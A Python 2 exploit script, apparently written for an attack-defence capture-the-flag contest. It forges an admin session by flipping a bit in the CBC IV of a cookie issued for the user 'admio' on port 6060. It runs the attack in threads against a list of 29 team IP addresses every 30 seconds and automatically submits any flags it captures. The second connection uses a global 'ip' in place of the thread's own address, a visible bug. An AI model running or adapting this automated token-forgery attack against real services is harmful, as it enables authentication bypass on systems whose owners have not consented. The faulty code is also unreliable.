from Crypto.Util.number import *
import socket
import re
import time
from submitter import submit_flag
import threading

class X(threading.Thread):
    def __init__(self,ip):
        threading.Thread.__init__(self)
        #self.daemon = True
        self.ip = ip

    def run(self):
        while(1):
            print('[+] Trying to exploit '+ self.ip)
            self.exploit()
            print('[+] Exploiting Again. timeout 30 seconds!. 0xidentifier = ' + self.ip)
            time.sleep(30)

    def exploit(self):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.connect((self.ip,6060))
            time.sleep(1)
            sock.recv(4096)
            sock.send('1\nadmio\n')
            time.sleep(1)
            vars = sock.recv(40960)
            cookie = vars[vars.find('[+] Here, take your cookie: ') + len('[+] Here, take your cookie: ')+4:]
            iv = cookie[:32]
            data = cookie[32:]
            iv2 = (long_to_bytes(int(iv,16) ^ 0x010000)).encode('hex')
            cookie2 = iv2 + data
            sock.close()
            time.sleep(1)
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.connect((ip,6060))
            time.sleep(1)
            sock.recv(4096)
            sock.send('2\n')
            time.sleep(1)
            sock.recv(4096)
            sock.send(cookie2)
            #print(cookie2)
            sock.send('\n')
            time.sleep(1)
            flag_str = sock.recv(40960)
            #print(flag_str)
            flag = flag_str[flag_str.find('[+] Are you really admin? Here, take your flag anyway!')+len("[+] Are you really admin? Here, take your flag anyway!")+5:-1]
            if(flag.find('FLG')!=-1):
                submit_flag(flag)
                print(flag)
            print("[+] Exploited " + self.ip)
        except:
            pass
            #print('[+]Patched SYstem' + self.ip)



ips = [
 "10.115.1.2",
 "10.115.1.18",
 "10.115.1.34",
 "10.115.1.50",
 "10.115.1.66",
 "10.115.1.82",
 "10.115.1.98",
 "10.115.1.114",
 "10.115.1.130",
 "10.115.1.146",
 "10.115.1.162",
 "10.115.1.178",
 "10.115.1.194",
 "10.115.1.210",
 "10.115.1.226",
 "10.115.1.242",
 "10.115.2.2",
 "10.115.2.18",
 "10.115.2.50",
 "10.115.2.66",
 "10.115.2.82",
 "10.115.2.98",
 "10.115.2.114",
 "10.115.2.130",
 "10.115.2.146",
 "10.115.2.162",
 "10.115.2.178",
 "10.115.2.226",
 "10.115.2.194",
]
threads = [X(ip) for ip in ips]

try:
    for thread in threads:
        thread.start()
except KeyboardInterrupt:
    exit()
